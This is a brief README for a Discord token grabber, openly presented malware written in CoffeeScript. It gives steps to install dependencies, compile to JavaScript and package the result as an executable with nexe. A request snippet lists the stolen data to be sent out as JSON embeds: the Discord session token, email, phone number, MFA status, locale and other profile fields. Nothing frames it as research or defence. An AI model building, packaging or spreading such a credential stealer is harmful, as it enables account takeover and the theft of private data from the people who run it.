# Discord token grabber

installation ( coffeescript ):
  `npm install coffee-script -g -d`

  modules:
    `npm install`

compile ( js ):
  `coffee --compile lib main.coffee` and `cd lib`

compile ( js -> exe ):
   `npm install nexe -g -d` and `nexe main.js`


request:
```coffee

setting =
  headers: 'Content-Type': 'application/json'
  body: 
    embeds:
      title
      token
      uuid
      tag
      username
      discriminator
      email
      phone
      verified
      nsfw_allowed
      mfa_enabled
      locale
      bio
      banner
return
```

result:

![ScreenShot](/screen/Capture.png)